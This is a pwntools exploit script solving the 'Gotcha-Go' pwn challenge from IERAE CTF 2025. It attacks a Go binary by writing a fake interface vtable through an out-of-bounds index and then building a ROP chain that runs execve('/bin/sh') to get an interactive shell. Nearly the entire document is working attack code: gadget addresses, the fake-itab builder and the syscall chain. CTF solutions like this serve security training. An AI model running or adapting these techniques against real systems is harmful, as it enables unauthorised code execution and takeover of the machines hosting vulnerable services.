# Gotcha-Go
# IERAE CTF 2025 -pwn-
# Author: tsuneki

from pwn import *
import sys

e = ELF("../challenge/ctf",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 127.0.0.1 33337"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    b main.(*MyList).info
    b main.(*MyList).init
    b main.(*MyList).edit
    b main.(*MyStr).info
    b main.(*MyStr).init
    b main.(*MyStr).edit
    d
    c
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b,drop=True)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data

main_l = 0x0565290

def create(idx:int, data:bytes):
    print("[*] create")
    ru(b"(1.Init, 2.Info, 3.Edit):")
    sl(b"1")
    ru(b"Idx):")
    sl(str(idx).encode())
    sl(data)

def info(idx:int):
    print("[*] update")
    ru(b"(1.Init, 2.Info, 3.Edit):")
    sl(b"2")
    ru(b"Idx):")
    sl(str(idx).encode())
    return ru(b"Option")

def edit(idx:int, data:bytes):
    print("[*] edit")
    ru(b"(1.Init, 2.Info, 3.Edit):")
    sl(b"3")
    ru(b"Idx):")
    sl(str(idx).encode())
    sl(data)

def fakeItab(
        init:int=e.sym["main.(*MyList).init"],
        info:int=e.sym["main.(*MyList).info"],
        edit:int=e.sym["main.(*MyList).edit"],
        )->bytes:
    itab = b"\x80\xdeJ\x00\x00\x00\x00\x00\x00\xcaJ\x00\x00\x00\x00\x00\xdc\xa2;J\x00\x00\x00\x00"
    itab += p64(edit)
    itab += p64(info)
    itab += p64(init)
    itab = itab[8:] # cut off the first 8 bytes regarding the size of idx:int64
    print(f"[*] {len(itab)=}")
    print(f"[*] {itab=}")
    return itab

oob_idx = (0x56bfc0-0x5669c0)//8
strinit = e.sym["main.(*MyStr).init"]
strinfo = e.sym["main.(*MyStr).info"]
stredit = e.sym["main.(*MyStr).edit"]

"""
PoC
fake = fakeItab(init=0xdeadbeaf, info=0xabad1dea, edit=0xdead1dea)
create(oob_idx*-1, fake)
"""

fake = fakeItab()
create(oob_idx*-1, fake)

fake = fakeItab(edit=strinit)
edit(oob_idx*-1, fake)


rsp = 0xc0000a4e40
#rsp = 0xc000104e70 # in author's environment
binsh = 0x56bfc0+0x8*2
edit(0,p64(rsp-0x8)+b"/bin/sh\x00")

# At first we neet to know the rsp to rop.
# We can use crash dump to leak the stack pointer.
#fake = fakeItab(edit=0xdeadbeaf) #restore itab vtable

fake = fakeItab() #restore itab vtable
create(oob_idx*-1, fake)

pop_rdx = 0x00450f73# pop rdx; or [rcx-0xa], eax; ret;
pop_rdi = 0x00473fc6# pop rdi; setne al; ret;
pop_rax = 0x00408744# pop rax; ret;
syscall = 0x0046dca5# syscall; ret;

chain = flat(
    pop_rdi,
    binsh,
    pop_rax,
    0x3b,
    syscall,
)

edit(1, chain)

shell()
